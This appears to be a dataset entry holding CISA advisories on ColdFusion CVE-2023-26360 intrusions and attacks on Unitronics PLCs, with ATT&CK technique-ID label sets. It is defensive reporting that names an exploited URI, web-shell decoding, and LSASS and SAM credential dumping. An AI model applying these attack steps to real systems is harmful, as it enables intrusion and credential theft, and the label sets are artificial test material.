Threat actors attempted to harvest user account credentials through LSASS memory dumping.


OS Credential Dumping: Security Account Manager
T1003.002
Threat actors saved and compressed SAM information to .zip files.




Table 8: Discovery


Technique Title
ID
Use




System Network Configuration Discovery: Internet Connection Discovery
T1016.001
Threat actors periodically tested network connectivity by pinging Google’s DNS.


Network Service Discovery
T1046
Threat actors scanned at least three subnets to gather network information using fscan.exe, to include administrative data for future exfiltration.


System Information Discovery
T1082
Threat actors collected information about the web server and its operating system.


File and Directory Discovery
T1083
Threat actors traversed and were able to search through folders on the victim’s web server filesystem. Additional reconnaissance efforts were conducted via searching for the .jsp files that were uploaded.


Account Discovery: Local Account
T1087.001
Threat actors collected information about local user accounts.


Account Discovery: Domain Account
T1087.002
Threat actors collected information about domain users, including identification of domain admin accounts.


Domain Trust Discovery
T1482
Threat actors enumerated domain trusts to identify lateral movement opportunities.


Software Discovery
T1518
Following initial access and enumeration, threat actors checked for the presence of ColdFusion version 2018 on the victim web server.




Table 9: Command and Control


Technique Title
ID
Use




Application Layer Protocol: Web Protocols
T1071.001
Threat actors used HTTP POST requests to config.cfm, an expected configuration file in a standard installation of ColdFusion.


Ingress Tool Transfer
T1105
Threat actors were able to upload malicious artifacts to the victim web server.



MITIGATIONS
CISA recommends organizations implement the mitigations below to improve your organization’s cybersecurity posture based on threat actor activity. These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats, tactics, techniques, and procedures. Visit CISA’s Cross-Sector Cybersecurity Performance Goals for more information on the CPGs, including additional recommended baseline protections.
These mitigations apply to all critical infrastructure organizations and network defenders. CISA recommends that software manufacturers incorporate secure-by-design and -default principles and tactics into their software development practices, limiting the impact of threat actor techniques and strengthening the security posture for their customers. For more information on secure by design, see CISA’s Secure by Design webpage.
Manage Vulnerabilities and Configurations

Upgrade all versions affected by this vulnerability. Keep all software up to date and prioritize patching according to CISA’s Known Exploited Vulnerabilities Catalog [1.E].
Prioritize remediation of vulnerabilities on internet-facing systems, for example, by conducting continuous automated and/or routine vulnerability scans.
Prioritize secure-by-default configurations such as eliminating default passwords, implementing single sign-on (SSO) technology via modern open standards. This also includes disabling default credentials.

Segment Networks

Employ proper network segmentation, such as a demilitarized zone (DMZ) [2.F]. The end goal of a DMZ network is to allow an organization to access untrusted networks, such as the internet, while ensuring its private network or local area network (LAN) remains secure. Organizations typically store external-facing services and resources—as well as servers used for DNS, file transfer protocol (FTP), mail, proxy, voice over internet protocol (VoIP)—and web servers in the DMZ.
Use a firewall or web-application firewall (WAF) and enable logging [2.G, 2.T] to prevent/detect potential exploitation attempts. Review ingress and egress firewall rules and block all unapproved protocols. Limit risky (but approved) protocols through rules.
Implement network segmentation to separate network segments based on role and functionality [2.E]. Proper network segmentation significantly reduces the ability for threat actor lateral movement by controlling traffic flows between—and access to—various subnetworks. See CISA’s Layering Network Security Through Segmentation infographic and the National Security Agency’s (NSA’s) Segment Networks and Deploy Application-Aware Defenses.
Deploy application-aware network defenses to block improperly formed traffic and restrict content, according to policy and legal authorizations. Traditional intrusion detection systems (IDS) based on known-bad signatures are quickly decreasing in effectiveness due to encryption and obfuscation techniques. Threat actors hide malicious actions and remove data over common protocols, making the need for sophisticated, application-aware defensive mechanisms critical for modern network defenses.

Application Control

Enforce signed software execution policies. Use a modern operating system that enforces signed software execution policies for scripts, executables, device drivers, and system firmware. Maintain a list of trusted certificates to prevent and detect the use and injection of illegitimate executables. Execution policies, when used in conjunction with a secure boot capability, can assure system integrity.
Application control should be used with signed software execution policies to provide greater control. Allowing unsigned software enables threat actors to gain a foothold and establish persistence through embedded malicious code. See NSA’s Enforce Signed Software Execution Policies.

Manage Accounts, Permissions, and Workstations

Require phishing-resistant multifactor authentication (MFA) [2.H] for all services to the extent possible, particularly for webmail, VPN, and accounts that access critical systems.
Implement the principle of least privilege to decrease threat actors’ abilities to access key network resources.
Restrict file and directory permissions. Use file system access controls to protect folders such as C:\Windows\System32.
Restrict NTLM authentication policy settings, including incoming NTLM traffic from client computers, other member servers, or a domain controller.[8]

VALIDATE SECURITY CONTROLS
In addition to applying mitigations, CISA recommends exercising, testing, and validating your organization's security program against the threat behaviors mapped to the MITRE ATT&CK for Enterprise framework in this advisory. CISA recommends testing your existing security controls inventory to assess how they perform against the ATT&CK techniques described in this advisory.
To get started:

Select an ATT&CK technique described in this advisory (see Tables 2-9).
Align your security technologies against the technique.
Test your technologies against the technique.
Analyze your detection and prevention technologies’ performance.
Repeat the process for all security technologies to obtain a set of comprehensive performance data.
Tune your security program, including people, processes, and technologies, based on the data generated by this process.

CISA recommends continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&CK techniques identified in this advisory.
RESOURCES

NIST: CVE-2023-26360
CISA: KEV Catalog
CISA, MITRE: Best Practices for MITRE ATT&CK Mapping
CISA: Decider Tool
CISA: Cross-Sector Cybersecurity Performance Goals
CISA: Secure by Design and Default
CISA: Layering Network Security Through Segmentation
NSA: Segment Networks and Deploy Application-Aware Defenses
NSA: Enforce Signed Software Execution Policies
CISA: Implementing Phishing-Resistant MFA

REFERENCES
[1] Packet Storm Security: Adobe ColdFusion Unauthenticated Remote Code Execution[2] MITRE: certutil[3] VirusTotal: File - a3acb9f79647f813671c1a21097a51836b0b95397ebc9cd178bc806e1773c864[4] Bleeping Computer: Stealthy New JavaScript Malware Infects Windows PCs with RATs[5] GitHub: Tas9er/ByPassGodzilla[6] MITRE: esentutl[7] Microsoft: Active Directory - SYSVOL[8] Microsoft: Restrict NTLM - Incoming NTLM Traffic
DISCLAIMER
The information in this report is being provided “as is” for informational purposes only. CISA does not endorse any commercial entity, product, company, or service, including any entities, products, or services linked within this document. Any reference to specific commercial entities, products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by CISA.
VERSION HISTORY
December 5, 2023: Initial version.






This product is provided subject to this Notification and this Privacy & Use policy.


","{'T1083', 'T1003.002', 'T1505.003', 'T1482', 'T1190', 'T1087.002', 'T1484.001', 'T1036.005', 'T1105', 'T1082', 'T1087.001', 'T1003.001', 'T1140', 'T1564.001', 'T1070.004', 'T1046', 'T1518', 'T1059.007', 'T1016.001', 'T1071.001', 'T1036.008'}","






Actions to take today to mitigate malicious cyber activity:




Prioritize remediating known exploited vulnerabilities.
Employ proper network segmentation.
Enable multifactor authentication (MFA) for all services to the extent possible, particularly for webmail, VPN, and accounts that access critical systems.







SUMMARY
The Cybersecurity and Infrastructure Security Agency (CISA) is releasing a Cybersecurity Advisory (CSA) in response to confirmed exploitation of CVE-2023-26360 by unidentified threat actors at a Federal Civilian Executive Branch (FCEB) agency. This vulnerability presents as an improper access control issue impacting Adobe ColdFusion versions 2018 Update 15 (and earlier) and 2021 Update 5 (and earlier). CVE-2023-26360 also affects ColdFusion 2016 and ColdFusion 11 installations; however, they are no longer supported since they reached end of life. Exploitation of this CVE can result in arbitrary code execution. Following the FCEB agency’s investigation, analysis of network logs confirmed the compromise of at least two public-facing servers within the environment between June and July 2023.
This CSA provides network defenders with tactics, techniques, and procedures (TTPs), indicators of compromise (IOCs), and methods to detect and protect against similar exploitation.
Download the PDF version of this report:


AA23-339A Threat Actors Exploit Adobe ColdFusion CVE-2023-26360 for Initial Access to Government Servers
(PDF,       449.49 KB
  )


For a downloadable copy of IOCs, see:


AA23-339A STIX XML
(XML,       23.83 KB
  )




AA23-339A STIX JSON
(JSON,       23.29 KB
  )


TECHNICAL DETAILS
Note: This advisory uses the MITRE ATT&CK® for Enterprise framework, version 14. See the MITRE ATT&CK Tactics and Techniques section for tables mapped to the threat actors’ activity.
Overview
Adobe ColdFusion is a commercial application server used for rapid web-application development. ColdFusion supports proprietary markup languages for building web applications and integrates external components like databases and other third-party libraries. ColdFusion uses a proprietary language, ColdFusion Markup Language (CFML), for development but the application itself is built using JAVA.
In June 2023, through the exploitation of CVE-2023-26360, threat actors were able to establish an initial foothold on two agency systems in two separate instances. In both incidents, Microsoft Defender for Endpoint (MDE) alerted of the potential exploitation of an Adobe ColdFusion vulnerability on public-facing web servers in the agency’s pre-production environment. Both servers were running outdated versions of software which are vulnerable to various CVEs. Additionally, various commands were initiated by the threat actors on the compromised web servers; the exploited vulnerability allowed the threat actors to drop malware using HTTP POST commands to the directory path associated with ColdFusion.
Analysis suggests that the malicious activity conducted by the threat actors was a reconnaissance effort to map the broader network. No evidence is available to confirm successful data exfiltration or lateral movement during either incident. Note: It is unknown if the same or different threat actors were behind each incident.
Incident 1
As early as June 26, 2023, threat actors obtained an initial foothold on a public-facing, web server running Adobe ColdFusion v2016.0.0.3 through exploitation of CVE-2023-26360. Threat actors successfully connected from malicious IP address 158.101.73,.,241. Disclaimer: CISA recommends organizations investigate or vet this IP address prior to taking action, such as blocking. This IP resolves to a public cloud service provider and possibly hosts a large volume of legitimate traffic.
The agency’s correlation of Internet Information Services (IIS) logs against open source,1, information indicates that the identified uniform resource identifier (URI) /cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/iedit.cfc was used to exploit CVE-2023-26360. The agency removed the asset from the network within 24 hours of the MDE alert.
Threat actors started process enumeration to obtain currently running processes on the web server and performed a network connectivity check, likely to confirm their connection was successful. Following additional enumeration efforts to obtain information about the web server and its operating system, the threat actors checked for the presence of ColdFusion version 2018,—previous checks were also conducted against version 2016.
Threat actors were observed traversing the filesystem, and uploading various artifacts to the web server, to include deleting the file tat.cfm,. Note: This file was deleted prior to the victim locating it on the host for analysis. Its characteristics and functionality are unknown. In addition:

Certutil,2, was run against conf.txt, and decoded as a web shell (config.jsp),. Conf.txt was subsequently deleted, likely to evade detection.Note: Threat actors were only observed interacting with the config.jsp web shell from this point on.
HTTP POST requests, were made to config.cfm, an expected configuration file in a standard installation of ColdFusion,. Code review of config.cfm indicated malicious code—intended to execute on versions of ColdFusion 9 or less—was inserted with the intent to extract username, password, and data source uniform resource locators (URLs). According to analysis, this code insertion could be used in future malicious activity by the threat actors (e.g., by using the valid credentials that were compromised). This file also contained code used to upload additional files by the threat actors; however, the agency was unable to identify the source of their origin.
Threat actors attempted to run attrib.exe to hide the newly created config.jsp web shell,. Analysis of this phase found no indication of successful execution.
A small subset of events generated from various ColdFusion application logs identified that tat.cfm, config.jsp, and system.cfm failed to execute on the host due to syntax errors.

Threat actors created various files (see Table 1 below) in the C:\IBM directory using the initialization process coldfusion.exe. None of these files were located on the server (possibly due to threat actor deletion) but are assessed as likely threat actor tools. Analysts assessed the C:\IBM directory as a staging folder to support threat actors’ malicious operations.
Disclaimer: Organizations are encouraged to investigate the use of these files for related signs of compromise prior to performing remediation actions. Two artifacts are legitimate Microsoft files; threat actors were observed using these files following initial compromise for intended malicious purposes.

Note: The malicious code found on the system during this incident contained code that, when executed, would attempt to decrypt passwords for ColdFusion data sources. The seed value included in the code is a known value for ColdFusion version 8 or older—where the seed value was hard-coded. A threat actor who has control over the database server can use the values to decrypt the data source passwords in ColdFusion version 8 or older. The victim’s servers were running a newer version at the time of compromise; thus, the malicious code failed to decrypt passwords using the default hard-coded seed value for the older versions.
Incident 2
As early as June 2, 2023, threat actors obtained an initial foothold on an additional public-facing web server running Adobe ColdFusion v2021.0.0.2 via malicious IP address 125.227.50,.,97 through exploitation of CVE-2023-26360. Threat actors further enumerated domain trusts to identify lateral movement opportunities, by using nltest commands. The threat actors also collected information about local, and domain, administrative user accounts while performing reconnaissance by using commands such as localgroup, net user, net user /domain, and ID. Host and network reconnaissance efforts were further conducted to discover network configuration, time logs, and query user information.
Threat actors were observed dropping the file d.txt—decoded as d.jsp—via POST command in addition to eight malicious artifacts (hiddenfield.jsp, hiddenfield_jsp.class, hiddenfield_jsp.java, Connection.jsp, Connection_jsp.class, Connection_jsp.java, d_jsp.class, and d_jsp.java/). According to open source information, d.jsp is a remote access trojan (RAT) that utilizes a JavaScript loader, to infect the device and requires communication with the actor-controlled server to perform actions.,4, The agency’s analysis identified the trojan as a modified version of a publicly available web shell code.,5, After maintaining persistence, threat actors periodically tested network connectivity by pinging Google’s domain name system (DNS),. The threat actors conducted additional reconnaissance efforts via searching for the .jsp files that were uploaded.
Threat actors attempted to exfiltrate the (Registry) files sam.zip, sec.zip, blank.jsp, and cf-bootstrap.jar. Windows event logs identified the actors were not successful due to the malicious activity being detected and quarantined. An additional file (sys.zip) was created on the system; however, there were no indications of any attempt to exfiltrate it. Analysis identified these files resulted from executed save and compress data processes from the HKEY_LOCAL_MACHINE (HKLM) Registry key, as well as save security account manager (SAM), information to .zip files. The SAM Registry file may allow for malicious actors to obtain usernames and reverse engineer passwords; however, no artifacts were available to confirm that the threat actors were successful in exfiltrating the SAM Registry hive.
Windows event logs show that a malicious file (1.dat) was detected and quarantined. Analysis determined this file was a local security authority subsystem service (LSASS) dump, file that contained user accounts—to include multiple disabled credentials—and Windows new technology LAN manager (NTLM) passwords. The accounts were found on multiple servers across the victim’s network and were not successfully used for lateral movement.
As efforts for reconnaissance continued, the threat actors changed their approach to using security tools that were present on the victim server. Esentutl.exe,6, was used to attempt this registry dump. Attempts to download data from the threat actors’ command and control (C2) server were also observed but blocked and logged by the victim server. Threat actors further attempted to access SYSVOL, which is used to deliver policy and logon scripts to domain members on an agency domain controller,. The attempt was unsuccessful. Had the attempt succeeded, the threat actors may have been able to change policies across compromised servers.,7,
Note: During this incident, analysis strongly suggests that the threat actors likely viewed the data contained in the ColdFusion seed.properties file via the web shell interface. The seed.properties file contains the seed value and encryption method used to encrypt passwords. The seed values can also be used to decrypt passwords. No malicious code was found on the victim system to indicate the threat actors attempted to decode any passwords using the values found in seed.properties file. Versions of ColdFusion 9 or greater use the seed.properties file, which contains unique seed values that can only be used on a single server.
MITRE ATT&CK TACTICS AND TECHNIQUES
See Tables 2-9 for all referenced threat actor tactics and techniques for enterprise environments in this advisory. For assistance with mapping malicious cyber activity to the MITRE ATT&CK framework, see CISA and MITRE ATT&CK’s Best Practices for MITRE ATT&CK Mapping and CISA’s Decider Tool.








MITIGATIONS
CISA recommends organizations implement the mitigations below to improve your organization’s cybersecurity posture based on threat actor activity. These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats, tactics, techniques, and procedures. Visit CISA’s Cross-Sector Cybersecurity Performance Goals for more information on the CPGs, including additional recommended baseline protections.
These mitigations apply to all critical infrastructure organizations and network defenders. CISA recommends that software manufacturers incorporate secure-by-design and -default principles and tactics into their software development practices, limiting the impact of threat actor techniques and strengthening the security posture for their customers. For more information on secure by design, see CISA’s Secure by Design webpage.
Manage Vulnerabilities and Configurations

Upgrade all versions affected by this vulnerability. Keep all software up to date and prioritize patching according to CISA’s Known Exploited Vulnerabilities Catalog,1.E,.
Prioritize remediation of vulnerabilities on internet-facing systems, for example, by conducting continuous automated and/or routine vulnerability scans.
Prioritize secure-by-default configurations such as eliminating default passwords, implementing single sign-on (SSO) technology via modern open standards. This also includes disabling default credentials.

Segment Networks

Employ proper network segmentation, such as a demilitarized zone (DMZ),2.F,. The end goal of a DMZ network is to allow an organization to access untrusted networks, such as the internet, while ensuring its private network or local area network (LAN) remains secure. Organizations typically store external-facing services and resources—as well as servers used for DNS, file transfer protocol (FTP), mail, proxy, voice over internet protocol (VoIP)—and web servers in the DMZ.
Use a firewall or web-application firewall (WAF) and enable logging,2.G, 2.T, to prevent/detect potential exploitation attempts. Review ingress and egress firewall rules and block all unapproved protocols. Limit risky (but approved) protocols through rules.
Implement network segmentation to separate network segments based on role and functionality,2.E,. Proper network segmentation significantly reduces the ability for threat actor lateral movement by controlling traffic flows between—and access to—various subnetworks. See CISA’s Layering Network Security Through Segmentation infographic and the National Security Agency’s (NSA’s) Segment Networks and Deploy Application-Aware Defenses.
Deploy application-aware network defenses to block improperly formed traffic and restrict content, according to policy and legal authorizations. Traditional intrusion detection systems (IDS) based on known-bad signatures are quickly decreasing in effectiveness due to encryption and obfuscation techniques. Threat actors hide malicious actions and remove data over common protocols, making the need for sophisticated, application-aware defensive mechanisms critical for modern network defenses.

Application Control

Enforce signed software execution policies. Use a modern operating system that enforces signed software execution policies for scripts, executables, device drivers, and system firmware. Maintain a list of trusted certificates to prevent and detect the use and injection of illegitimate executables. Execution policies, when used in conjunction with a secure boot capability, can assure system integrity.
Application control should be used with signed software execution policies to provide greater control. Allowing unsigned software enables threat actors to gain a foothold and establish persistence through embedded malicious code. See NSA’s Enforce Signed Software Execution Policies.

Manage Accounts, Permissions, and Workstations

Require phishing-resistant multifactor authentication (MFA),2.H, for all services to the extent possible, particularly for webmail, VPN, and accounts that access critical systems.
Implement the principle of least privilege to decrease threat actors’ abilities to access key network resources.
Restrict file and directory permissions. Use file system access controls to protect folders such as C:\Windows\System32.
Restrict NTLM authentication policy settings, including incoming NTLM traffic from client computers, other member servers, or a domain controller.,8,

VALIDATE SECURITY CONTROLS
In addition to applying mitigations, CISA recommends exercising, testing, and validating your organization's security program against the threat behaviors mapped to the MITRE ATT&CK for Enterprise framework in this advisory. CISA recommends testing your existing security controls inventory to assess how they perform against the ATT&CK techniques described in this advisory.
To get started:

Select an ATT&CK technique described in this advisory (see Tables 2-9).
Align your security technologies against the technique.
Test your technologies against the technique.
Analyze your detection and prevention technologies’ performance.
Repeat the process for all security technologies to obtain a set of comprehensive performance data.
Tune your security program, including people, processes, and technologies, based on the data generated by this process.

CISA recommends continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&CK techniques identified in this advisory.
RESOURCES

NIST: CVE-2023-26360
CISA: KEV Catalog
CISA, MITRE: Best Practices for MITRE ATT&CK Mapping
CISA: Decider Tool
CISA: Cross-Sector Cybersecurity Performance Goals
CISA: Secure by Design and Default
CISA: Layering Network Security Through Segmentation
NSA: Segment Networks and Deploy Application-Aware Defenses
NSA: Enforce Signed Software Execution Policies
CISA: Implementing Phishing-Resistant MFA

REFERENCES,1, Packet Storm Security: Adobe ColdFusion Unauthenticated Remote Code Execution,2, MITRE: certutil,3, VirusTotal: File - a3acb9f79647f813671c1a21097a51836b0b95397ebc9cd178bc806e1773c864,4, Bleeping Computer: Stealthy New JavaScript Malware Infects Windows PCs with RATs,5, GitHub: Tas9er/ByPassGodzilla,6, MITRE: esentutl,7, Microsoft: Active Directory - SYSVOL,8, Microsoft: Restrict NTLM - Incoming NTLM Traffic
DISCLAIMER
The information in this report is being provided “as is” for informational purposes only. CISA does not endorse any commercial entity, product, company, or service, including any entities, products, or services linked within this document. Any reference to specific commercial entities, products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by CISA.
VERSION HISTORY
December 5, 2023: Initial version.






This product is provided subject to this Notification and this Privacy & Use policy.


","['T1505', 'T1016', 'T1583', 'T1482', 'T1001', 'T1102', 'T1112', 'T1498', 'T1531', 'T1587', 'T1480', 'T1218', 'T1059', 'T1124', 'T1588', 'T1485', 'T1203', 'T1087', 'T1027', 'T1098', 'T1140', 'T1069', 'T1049', 'T1012', 'T1190', 'T1020', 'T1564', 'T1555', 'T1213']","{'T1003.001', 'T1518.001', 'T1003.003', 'T1057', 'T1078.002', 'T1046', 'T1018', 'T1573.001', 'T1222', 'T1111', 'T1564.001', 'T1016', 'T1036.005', 'T1074.001', 'T1583', 'T1482', 'T1555.002', 'T1556.009', 'T1082', 'T1102', 'T1555.003', 'T1222.001', 'T1189', 'T1105', 'T1003.002', 'T1599', 'T1203', 'T1087.002', 'T1027', 'T1562.002', 'T1140', 'T1070.001', 'T1560.001', 'T1553.002', 'T1552.001', 'T1070.004', 'T1078.001', 'T1083', 'T1071', 'T1505.001', 'T1556', 'T1190', 'T1078', 'T1210', 'T1552.006', 'T1505.003', 'T1059.008', 'T1562.004', 'T1553.006', 'T1599.001', 'T1555'}","{'T1003.001', 'T1518.001', 'T1003.003', 'T1078.002', 'T1046', 'T1018', 'T1573.001', 'T1222', 'T1111', 'T1036.005', 'T1595.001', 'T1074.001', 'T1482', 'T1555.002', 'T1556.009', 'T1082', 'T1102', 'T1555.003', 'T1067', 'T1222.001', 'T1158', 'T1016, T1082', 'T1105', 'T1003.002', 'T1189', 'T1599', 'T1219', 'T1484', 'T1203', 'T1087.002', 'T1027', 'T1562.002', 'T1140', 'T1070.001', 'T1560.001', 'T1497', 'T1553.002', 'T1480.001', 'T1070.004', 'T1078.001', 'T1552.001', 'T1083', 'T1071', 'T1505.001', 'T1071.001', 'T1057, T1016.001', 'T1597.001', 'T1562.007', 'T1190', 'T1078', 'T1552.006', 'T1505.003', 'T1059.008', 'T1554', 'T1562.004', 'T1553.006', 'T1599.001', 'T1555', 'T1003'}","{'T1070', 'T1203, T1105, T1071, T1078, T1046', 'T1078, T1570', 'T1505', 'T1606', 'T1203, T1218, T1059, T1071, T1562', 'T1595', 'T1222', 'T1078, T1190', 'T1070, T1505', 'T1553', 'T1482', 'T1552', 'T1074', 'T1105', 'T1218', 'T1059', 'T1595, T1592, T1087', 'T1071, T1105, T1070', 'T1219', 'T1505, T1059', 'T1040', 'T1203', 'T1087', 'T1190, T1105', 'T1071, T1070', 'T1129', 'T1140', 'T1567', 'T1071', 'T1557, T1556', 'T1556', 'T1190', 'T1546', 'T1564', 'T1078', 'T1560', 'T1057, T1049', 'T1562', 'T1554', 'T1555', 'T1003'}"
11,https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-335a,"






Actions to take today to mitigate malicious activity:




Implement multifactor authentication.
Use strong, unique passwords.
Check PLCs for default passwords.







SUMMARY
The Federal Bureau of Investigation (FBI), Cybersecurity and Infrastructure Security Agency (CISA), National Security Agency (NSA), Environmental Protection Agency (EPA), and the Israel National Cyber Directorate (INCD)—hereafter referred to as ""the authoring agencies""—are disseminating this joint Cybersecurity Advisory (CSA) to highlight continued malicious cyber activity against operational technology devices by Iranian Government Islamic Revolutionary Guard Corps (IRGC)-affiliated Advanced Persistent Threat (APT) cyber actors.
The IRGC is an Iranian military organization that the United States designated as a foreign terrorist organization in 2019. IRGC-affiliated cyber actors using the persona “CyberAv3ngers” are actively targeting and compromising Israeli-made Unitronics Vision Series programmable logic controllers (PLCs). These PLCs are commonly used in the Water and Wastewater Systems (WWS) Sector and are additionally used in other industries including, but not limited to, energy, food and beverage manufacturing, and healthcare. The PLCs may be rebranded and appear as different manufacturers and companies. In addition to the recent CISA Alert, the authoring agencies are releasing this joint CSA to share indicators of compromise (IOCs) and tactics, techniques, and procedures (TTPs) associated with IRGC cyber operations.
Since at least November 22, 2023, these IRGC-affiliated cyber actors have continued to compromise default credentials in Unitronics devices. The IRGC-affiliated cyber actors left a defacement image stating, “You have been hacked, down with Israel. Every equipment ‘made in Israel’ is CyberAv3ngers legal target.” The victims span multiple U.S. states. The authoring agencies urge all organizations, especially critical infrastructure organizations, to apply the recommendations listed in the Mitigations section of this advisory to mitigate risk of compromise from these IRGC-affiliated cyber actors.
This advisory provides observed IOCs and TTPs the authoring agencies assess are likely associated with this IRGC-affiliated APT. For more information on Iranian state-sponsored malicious cyber activity, see CISA’s Iran Cyber Threat Overview and Advisories webpage and the FBI’s Iran Threat webpage.
For a PDF version of this CSA, see: 


AA23-335A IRGC-Affiliated Cyber Actors Exploit PLCs in Multiple Sectors, Including U.S. Water and Wastewater Systems Facilities
(PDF,       594.03 KB
  )


For a downloadable copy of IOCs, see:


AA23-335A STIX XML
(XML,       15.50 KB
  )




AA23-335A STIX JSON
(JSON,       10.84 KB
  )


TECHNICAL DETAILS
Note: This advisory uses the MITRE ATT&CK® for Enterprise framework, version 14. See Table 1 for threat actor activity mapped to MITRE ATT&CK tactics and techniques. For assistance with mapping malicious cyber activity to the MITRE ATT&CK framework, see CISA and MITRE ATT&CK’s Best Practices for MITRE ATT&CK Mapping and CISA’s Decider Tool.
Overview
CyberAv3ngers (also known as CyberAveng3rs, Cyber Avengers) is an Iranian IRGC cyber persona that has claimed responsibility for numerous attacks against critical infrastructure organizations.[1],[2],[3],[4],[5] The group claimed responsibility for cyberattacks in Israel beginning in 2020. CyberAv3ngers falsely claimed they compromised several critical infrastructure organizations in Israel.[2] CyberAv3ngers also reportedly has connections to another IRGC-linked group known as Soldiers of Solomon.
(Updated December 14, 2023) Most recently, CyberAv3ngers began targeting U.S.-based WWS facilities that operate Unitronics PLCs.[1] The threat actors compromised Unitronics Vision Series PLCs with human machine interfaces (HMI). These compromised devices were publicly exposed to the internet with default passwords and by default are on TCP port 20256. On December 11, 2023, CVE-2023-6448 was assigned to address the default passwords [CWE-798: Use of Hard Coded Credentials], and CISA added the CVE to its Known Exploited Vulnerabilities Catalog. On December 12, Unitronics released VisiLogic version 9.9.00 software to address this CVE; the update requires users to change default passwords.
These PLC and related controllers are often exposed to outside internet connectivity due to the remote nature of their control and monitoring functionalities. The compromise is centered around defacing the controller’s user interface and may render the PLC inoperative. With this type of access, deeper device and network level accesses are available and could render additional, more profound cyber physical effects on processes and equipment. It is not known if additional cyber activities deeper into these PLCs or related control networks and components were intended or achieved. Organizations should consider and evaluate their systems for these possibilities.
Threat Actor Activity
The authoring agencies have observed the IRGC-affiliated activity since at least October 2023, when the actors claimed credit for the cyberattacks against Israeli PLCs on their Telegram channel. Since November 2023, the authoring agencies have observed the IRGC-affiliated actors target multiple U.S.-based WWS facilities that operate Unitronics Vision Series PLCs. Cyber threat actors likely compromised these PLCs since the PLCs were internet-facing and used Unitronics’ default password. Observed activity includes the following:

Between September 13 and October 30, 2023, the CyberAv3ngers Telegram channel displayed both legitimate and false claims of multiple cyberattacks against Israel. CyberAv3ngers targeted Israeli PLCs in the water, energy, shipping, and distribution sectors.
On October 18, 2023, the CyberAv3ngers-linked Soldiers of Solomon claimed responsibility for compromising over 50 servers, security cameras, and smart city management systems in Israel; however, majority of these claims were proven false. The group claimed to use a ransomware named “Crucio” against servers where the webcams camera software operated on port 7001.
Beginning on November 22, 2023, IRGC cyber actors accessed multiple U.S.-based WWS facilities that operate Unitronics Vision Series PLCs with an HMI likely by compromising internet-accessible devices with default passwords. The targeted PLCs displayed the defacement message, “You have been hacked, down with Israel. Every equipment ‘made in Israel’ is Cyberav3ngers legal target.”

INDICATORS OF COMPROMISE
See Table 1 for observed IOCs related to CyberAv3nger operations.
(Updated December 14, 2023)

Table 1: CyberAv3nger IOCs


Indicator
Type
Fidelity
Description




BA284A4B508A7ABD8070A427386E93E0
MD5
Suspected
MD5 hash associated with Crucio Ransomware



66AE21571FAEE1E258549078144325DC9DD60303
 

SHA1
Suspected
SHA1 hash associated with Crucio Ransomware



440b5385d3838e3f6bc21220caa83b65cd5f3618daea676f271c3671650ce9a3
 


SHA256
 

Suspected

SHA256 hash associated with Crucio Ransomware
 



178.162.227[.]180
IP address
Suspected
IP address associated with Crucio Ransomware


185.162.235[.]206
IP address
 
IP address associated with Crucio Ransomware



MITRE ATT&CK TACTICS AND TECHNIQUES
See Table 2 for referenced threat actor tactics and techniques in this advisory.

Table 2: Initial Access


Technique Title
ID
Use




Brute Force Techniques
T1110
Threat actors obtained login credentials, which they used to successfully log into Unitronics devices and provide root-level access.



MITIGATIONS
The authoring agencies recommend critical infrastructure organizations, including WWS sector facilities, implement the following mitigations to improve your organization’s cybersecurity posture to defend against CyberAv3ngers activity. These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats, tactics, techniques, and procedures. Visit CISA’s Cross-Sector Cybersecurity Performance Goals for more information on the CPGs, including additional recommended baseline protections.
Note: The below mitigations are based on threat actor activity against Unitronics PLCs but apply to all internet-facing PLCs.
Network Defenders
The cyber threat actors likely accessed the affected devices—Unitronics Vision Series PLCs with HMI—by exploiting cybersecurity weaknesses, including poor password security and exposure to the internet. To safeguard against this threat, the authoring agencies urge organizations to consider the following:
Immediate steps to prevent attack:

(Updated December 14, 2023) Upgrade devices to 9.9.00 VisiLogic software, which requires users to change the default passwords on PLCs and HMIs. Use a strong password. For more information, see Unitronics’ blog Unitronics Cybersecurity for Vision and Samba PLC Series and Release notes for VisiLogic 9.9.00.
Disconnect the PLC from the public-facing internet.

Follow-on steps to strengthen your security posture:

Implement multifactor authentication for access to the operational technology (OT) network whenever applicable.
If you require remote access, implement a firewall and/or virtual private network (VPN) in front of the PLC to control network access. A VPN or gateway device can enable multifactor authentication for remote access even if the PLC does not support multifactor authentication.
Create strong backups of the logic and configurations of PLCs to enable fast recovery. Familiarize yourself with factory resets and backup deployment as preparation in the event of ransomware activity.
Keep your Unitronics and other PLC devices updated with the latest versions by the manufacturer.
Confirm third-party vendors are applying the above recommended countermeasures to mitigate exposure of these devices and all installed equipment.

In addition, the authoring agencies recommend network defenders apply the following mitigations to limit potential adversarial use of common system and network discovery techniques, and to reduce the impact and risk of compromise by cyber threat actors:

Reduce risk exposure. CISA offers a range of services at no cost, including scanning and testing to help organizations reduce exposure to threats via mitigating attack vectors. CISA Cyber Hygiene services can help provide additional review of organizations’ internet-accessible assets. Email vulnerability@cisa.dhs.gov with the subject line, “Requesting Cyber Hygiene Services” to get started.

Device Manufacturers
Although critical infrastructure organizations using Unitronics (including rebranded Unitronics) PLC devices can take steps to mitigate the risks, it is ultimately the responsibility of the device manufacturer to build products that are secure by design and default. The authoring agencies urge device manufacturers to take ownership of the security outcomes of their customers by following the principles in the joint guide Shifting the Balance of Cybersecurity Risk: Principles and Approaches for Secure by Design Software, primarily:

